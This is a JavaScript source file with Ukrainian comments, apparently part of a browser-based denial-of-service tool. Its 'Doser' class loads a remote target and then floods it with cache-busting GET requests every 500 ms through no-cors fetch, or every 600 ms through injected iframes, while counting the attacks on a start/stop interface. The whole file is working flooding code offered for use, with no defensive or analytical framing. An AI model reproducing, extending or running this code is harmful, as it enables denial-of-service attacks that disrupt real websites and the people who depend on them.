/**Інтервал для `fetch` атаки*/
const fetchAttackInterval = 500;
/**Інтервал для `<iframe>` атаки*/
const iframeAttackInterval = 600;


/**
 * Зберігання данних про атаки
 */
function add_count() {
	if (!lockAttackCount) {
		attacks.text(parseInt(attacks.text()) + 1);

    	(d=>d.attacks = (d.attacks ? parseInt(d.attacks) : 0) + 1)(Database)
	} 
};

/**
 * Показ цілі користувачу
 * @param {?object} target **Ціль**
 */
function setTarget(target) {
	if (target) {
		targetField.text(target.page);
	    methodField.text("GET");
	    return true
	}
};

/**
 * Генерація **GET** запиту
 * @param {object} target **Ціль**
 * @returns **URL**
 */
const composeVictim = async target => `${target.page}?q=${floodString(64)}`;

/**
 * Воркер
 */
class Doser {
	/**
	 * Запуск атаки
	 * @param {boolean} isFetch
	 */
    async start(isFetch=true) {
    	this.attack = true; // Статус атаки
    	lockAttackCount = false; // Розблокування лічильника

        // Запуск атаки
        btn.text("Стоп");

        // Створення сповіщення про завантаження цілей
		// Тут теж буде рефакторинг
        (l=>{if (l[0]) l.remove()})($("#load"));
		$("<p>", {id:"load"}).text("Завантажуємо цілі...").appendTo(box);

		/**Ціль*/
        const target = await getTarget();

		// Якщо цілі не завантажились
        if (!setTarget(target)) {
        	// Якщо не завнтажились цілі

        	$("#load").text("Помилка завантаження!");
    		alert("Ой!", "Помилка!", "Перевірте підключення до інтернету!");

        	this.attack = false;
        	btn.text("Старт!");
        	return // Стоп
        };
        console.log(target);

        this.interval = isFetch ? setInterval(async () => {
        	await fetch([await composeVictim(target)], {
	            method: "GET",
	            mode: 'no-cors',
				referrerPolicy: 'no-referrer',
				cache: 'no-cache',
				expires: 0
	        })
	        .catch(add_count)
	        .then(add_count)

        }, fetchAttackInterval) : setInterval(async () => {
        	// Надсилання запиту на сайт за допомогою елементу iframe

        	await Frames.draw(target);

        	add_count();

        	if ($("#frames")[0].childElementCount >= 100) Frames.clear()
        }, iframeAttackInterval)
    };
	/**
	 * Зупинка атаки
	 */
    stop() {
    	if (this.interval) {
	    	this.attack = false;
	    	lockAttackCount = true;
	    	clearInterval(this.interval);
	    	Frames.clear();
	    	console.clear();
	    	btn.text("Старт!")
    	}
    }
}